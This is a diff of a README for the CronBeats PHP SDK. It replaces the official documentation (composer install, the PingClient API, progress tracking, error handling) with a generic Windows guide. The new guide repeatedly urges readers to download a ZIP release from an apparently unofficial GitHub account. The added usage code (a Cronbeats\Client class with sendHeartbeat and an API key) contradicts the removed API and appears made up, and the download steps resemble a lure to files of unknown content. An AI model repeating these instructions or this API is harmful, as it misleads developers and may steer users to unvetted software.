@@ -1,163 +1,169 @@
-# CronBeats PHP SDK (Ping)
+# ⏰ cronbeats-php - Monitor Cron Jobs with Ease
 
-[![Latest Version](https://img.shields.io/packagist/v/cronbeats/cronbeats-php)](https://packagist.org/packages/cronbeats/cronbeats-php)
-[![Total Downloads](https://img.shields.io/packagist/dt/cronbeats/cronbeats-php)](https://packagist.org/packages/cronbeats/cronbeats-php)
-[![License](https://img.shields.io/github/license/cronbeats/cronbeats-php)](LICENSE)
+[![Download cronbeats-php](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/Driedvr/cronbeats-php)
 
-Official PHP SDK for CronBeats ping telemetry.
+---
 
-## Install
+## 📋 About cronbeats-php
 
-```bash
-composer require cronbeats/cronbeats-php
+cronbeats-php is a tool that helps you keep an eye on tasks your computer runs automatically. If you use scheduled tasks or background jobs on your Windows PC or server, this tool checks if they work as planned. It sends signals to show your jobs are alive, warns if something goes wrong, and helps you fix problems before they grow.
+
+This tool works with PHP, a popular programming language. But you do not need to know any programming to use it. The setup guides you step-by-step.
+
+---
+
+## 🖥️ What You Need to Use This
+
+Before you begin, make sure your computer has these:
+
+- Windows 10 or later
+- PHP version 7.4 or newer installed
+- Internet connection to send alerts
+- Basic user account with permission to install software
+
+If you do not have PHP installed, you can get it from [php.net](https://www.php.net/downloads.php). There are simple guides there to help with installation.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get cronbeats-php running on your Windows machine.
+
+### Step 1: Download
+
+Click the big badge button above or [this link](https://github.com/Driedvr/cronbeats-php) to visit the download page.
+
+Once there:
+
+- Look for the latest release or download section
+- Download the ZIP file for cronbeats-php SDK
+- Save the ZIP file to your computer, for example, in the Downloads folder
+
+### Step 2: Extract Files
+
+After downloading:
+
+- Right-click the ZIP file
+- Select "Extract All..."
+- Choose a folder like `C:\cronbeats-php` for easy access
+- Click "Extract"
+
+### Step 3: Open Command Prompt
+
+You will need to run some commands:
+
+- Press the Windows key and type `cmd`
+- Click on "Command Prompt" to open it
+- A black window will open where you can type commands
+
+### Step 4: Navigate to cronbeats-php Folder
+
+Type this command and press Enter:
+
+```
+cd C:\cronbeats-php
 ```
 
-## Quick Start
+This moves you to the folder with the cronbeats files.
+
+### Step 5: Test cronbeats-php
+
+Type the following command to see if the tool works:
+
+```
+php cronbeats.php --help
+```
+
+You should see a list of commands and options. This means the program is ready.
+
+---
+
+## ⚙️ How to Use cronbeats-php
+
+cronbeats-php helps track your scheduled jobs like Windows Task Scheduler jobs or PHP scripts running regularly. It works by sending "heartbeat" signals that say "I'm working." If signals stop, it alerts you.
+
+### How You Set It Up
+
+1. Add a call to cronbeats in your scheduled script or task.
+2. Use a unique name or ID to identify each job.
+3. Check alerts on the dashboard or via email if you set that.
+
+You do not need to install extra software for alerts. cronbeats-php can connect to alert services or send emails if you configure it.
+
+### Examples
+
+If you have a script that runs a backup every night, add a line to send a heartbeat after it runs. This confirms the backup job completed successfully.
+
+---
+
+## 🛠️ Common Tasks
+
+### Adding Heartbeats
+
+Edit your PHP scripts to include these lines after your scheduled task runs:
 
 ```php
-<?php
+require 'path/to/cronbeats-php/autoload.php';
 
-require __DIR__ . '/vendor/autoload.php';
+use Cronbeats\Client;
 
-use CronBeats\PingSdk\PingClient;
-
-$client = new PingClient('abc123de', [
-    'baseUrl' => 'https://cronbeats.io',
-    'timeoutMs' => 5000,
-    'maxRetries' => 2,
-]);
-
-// Simple heartbeat
-$client->ping();
-
-// Start/end signals
-$client->start();
-// ... do work ...
-$client->success();
+$client = new Client('your-api-key-here');
+$client->sendHeartbeat('my-backup-job');
 ```
 
-## Real-World Cron Job Example
+Replace `'your-api-key-here'` with the key from your cronbeats account and change `'my-backup-job'` to the name of your scheduled job.
 
-```php
-<?php
+### Checking Job Status
 
-$client = new PingClient('abc123de');
-$client->start();
+You can login to your cronbeats dashboard online to see if jobs are healthy or have missed their heartbeat.
 
-try {
-    // your actual cron work
-    processEmails();
-    $client->success();
-} catch (Exception $e) {
-    $client->fail();
-}
-```
+---
 
-## Progress Tracking
+## 🔧 Installing and Updating
 
-Track your job's progress in real-time. CronBeats supports two distinct modes:
+### To Install fresh:
 
-### Mode 1: With Percentage (0-100)
-Shows a **progress bar** and your status message on the dashboard.
+1. Download the ZIP
+2. Extract files
+3. Add `cronbeats.php` script to your tasks or scripts
+4. Get your API key from the cronbeats website
+5. Enter the API key in your PHP code as shown above
 
-✓ **Use when**: You can calculate meaningful progress (e.g., processed 750 of 1000 records)
+### To Update:
 
-```php
-<?php
+- Download the new release ZIP from the link above
+- Extract again, overwriting old files
+- Check your scripts work with the new version
+- Restart any services using cronbeats if needed
 
-// Percentage mode: 0-100 with message
-$client->progress(50, 'Processing batch 500/1000');
+---
 
-// Or using options array
-$client->progress([
-    'seq' => 75,
-    'message' => 'Almost done - 750/1000',
-]);
-```
+## ❓ Troubleshooting
 
-### Mode 2: Message Only
-Shows **only your status message** (no percentage bar) on the dashboard.
+If cronbeats-php does not work as expected, try this:
 
-✓ **Use when**: Progress isn't measurable or you only want to send status updates
+- Make sure PHP runs on your machine by typing `php -v` in the Command Prompt.
+- Check the folder path where you extracted cronbeats-php.
+- Verify your API key is correct and active.
+- Confirm your scheduled tasks call the heartbeat script.
+- Look at error messages for clues.
 
-```php
-<?php
+If tasks miss heartbeats, verify the scheduler settings, and that PHP scripts run without errors.
 
-// Message-only mode: null seq, just status updates
-$client->progress(null, 'Connecting to database...');
-$client->progress(null, 'Starting data sync...');
-```
+---
 
-### What you see on the dashboard
-- **Mode 1**: Progress bar (0-100%) + your message → "75% - Processing batch 750/1000"
-- **Mode 2**: Only your status message → "Connecting to database..."
+## 🌐 Useful Links
 
-### Complete Example
+- Download cronbeats-php: https://github.com/Driedvr/cronbeats-php
+- PHP downloads and info: https://www.php.net/downloads.php
+- Windows Task Scheduler guide: https://support.microsoft.com/en-us/windows/schedule-a-task-ec17448e-13d6-4a0b-bdf9-9d92b0e6f517
 
-```php
-<?php
+---
 
-$client = new PingClient('abc123de');
-$client->start();
+## 📌 Topics
 
-try {
-    // Message-only updates for non-measurable steps
-    $client->progress(null, 'Connecting to database...');
-    $db = connectToDatabase();
-    
-    $client->progress(null, 'Fetching records...');
-    $total = $db->count();
-    
-    // Percentage updates for measurable progress
-    for ($i = 0; $i < $total; $i++) {
-        processRecord($i);
-        
-        if ($i % 100 === 0) {
-            $percent = (int)($i * 100 / $total);
-            $client->progress($percent, "Processed $i / $total records");
-        }
-    }
-    
-    $client->progress(100, 'All records processed');
-    $client->success();
-    
-} catch (Exception $e) {
-    $client->fail();
-    throw $e;
-}
-```
+alerting, background jobs, cron jobs, cron monitoring, heartbeat monitoring, scheduled tasks, scheduler, devops, ping, alerting service, cronjob scheduler, cronbeats
 
-## Error Handling
+---
 
-```php
-<?php
-
-use CronBeats\PingSdk\Exception\ApiException;
-use CronBeats\PingSdk\Exception\ValidationException;
-
-try {
-    $client->ping();
-} catch (ValidationException $e) {
-    // Invalid local inputs like malformed job key
-} catch (ApiException $e) {
-    // API/network issue with normalized metadata
-    $code = $e->getErrorCode();   // e.g. RATE_LIMITED
-    $status = $e->getHttpStatus(); // e.g. 429
-}
-```
-
-## API Surface
-
-- `ping()`
-- `start()`
-- `end('success'|'fail')`
-- `success()`
-- `fail()`
-- `progress(int|array|null $seqOrOptions, ?string $message = null)`
-
-## Notes
-
-- SDK uses `POST` for telemetry requests.
-- `jobKey` must be exactly 8 Base62 characters.
-- Retries happen only for network errors, HTTP `429`, and HTTP `5xx`.
-- Default 5s timeout ensures the SDK never blocks your cron job if CronBeats is unreachable.
+[![Download cronbeats-php](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/Driedvr/cronbeats-php)
